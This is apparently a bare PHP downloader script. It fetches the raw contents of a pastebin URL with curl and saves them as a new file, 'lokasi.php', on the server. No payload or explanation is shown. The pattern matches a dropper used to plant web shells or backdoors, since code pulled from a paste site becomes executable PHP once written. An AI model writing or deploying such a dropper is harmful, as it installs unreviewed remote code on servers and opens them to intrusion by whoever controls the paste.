<?php
$url = 'https://pastebin.mozilla.org/zPuYsSW1/raw';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);
file_put_contents('lokasi.php', $content);
?>
